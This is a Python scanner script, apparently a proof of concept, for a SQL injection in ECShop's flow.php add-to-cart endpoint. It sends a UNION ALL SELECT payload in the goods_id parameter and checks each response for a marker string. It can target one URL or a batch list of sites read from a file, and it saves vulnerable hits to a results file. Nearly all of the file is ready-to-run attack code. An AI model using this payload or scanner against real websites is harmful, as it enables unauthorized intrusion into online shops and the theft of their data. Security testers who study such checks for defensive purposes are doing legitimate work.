import requests
import urllib3
import sys
from colorama import init,Fore
init(autoreset=True)
urllib3.disable_warnings()

# 全局变量
headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36',
    'Content-Type' : 'application/x-www-form-urlencoded'
}
datas = {
    'goods' : '{"quick":"1","spec":[],"goods_id":"1-2338 UNION ALL SELECT NULL,NULL,CONCAT(0x716a767a71,0x4273757955585843696e594c75666276534c4c504f41776742454d51464e4a5859444d696d6c6175,0x716a7a7671),NULL-- -","number":"1","parent":"0"}'
}
proxies = {
    'http' : 'http://127.0.0.1:8888'
}

# 单网站测试
def One_Ecshop(target_url):
    url = target_url + "/flow.php?step=add_to_cart"
    get = requests.get(url=url, verify=False, timeout=(6))
    if 200 == get.status_code:
        try:
            req = requests.post(url=url, headers=headers, data=datas, verify=False, timeout=(6))
            if 'qjvzq' in req.text:
                print(Fore.RED + "URL：{0} 疑似存在ECShop Sqli".format(url))
            else:
                print("URL：{0} 不存在flow.php".format(url))
        except requests.exceptions.ConnectTimeout:
            print('超时！')
        except requests.exceptions.ReadTimeout:
            print('读取失败')
        except requests.exceptions.ConnectionError:
            print('无效地址！' + url)


# 文件导入批量测试
def FileEcshop(target_file):
    with open(target_file, 'r') as f:
        for webs in f.readlines():
            web = webs.replace("\n", '')
            if 'http' not in web:
                web = 'http://' + web
            try:
                url = web + "/flow.php?step=add_to_cart"
                get = requests.get(url=url, verify=False, timeout=(6))
                if 200 == get.status_code:
                    req = requests.post(url=url, headers=headers, data=datas, verify=False, timeout=(6))
                    print(url)
                    if 'qjvzq' in req.text:
                        print(Fore.RED + "URL：{0} 疑似存在ECShop Sqli".format(url))
                        with open('Result.txt', 'a') as result:
                            result.write(url)
                            result.write('\n')
                else:
                    print("URL：{0} 不存在flow.php".format(url))

            except requests.exceptions.ConnectTimeout:
                print('超时！')
            except requests.exceptions.ReadTimeout:
                print('读取失败')
            except requests.exceptions.ConnectionError:
                print('无效地址！' + url)

# tu3k.cn
if __name__ == '__main__':
    print(
    '''
    		****************************************************
    		*       ecshop Sqli(flow.php?step=add_to_cart)     *
    		*	            Coded by Tu3k                  *
    		****************************************************
    		Usage:
    		ecshop_vul.py -h
    		ecshop_vul.py -u http://localhost
    		ecshop_vul.py -f target.txt
    ''')
    Usage = "python3 ecshop_vul.py -u http://localhost"
    if len(sys.argv) < 2:
        print('至少传入一个参数\r\n'
              '例：{0}'.format(Usage))
    else:
        if sys.argv[1] == '-h':
            print("漏洞简介：漏洞点在添加购物车处，good_id参数过滤不严谨导致Sql注入")
        elif sys.argv[2]:
            if sys.argv[1] == '-u':
                target_url = sys.argv[2]
                One_Ecshop(target_url)
            elif sys.argv[1] == '-f':
                target_file = sys.argv[2]
                FileEcshop(target_file)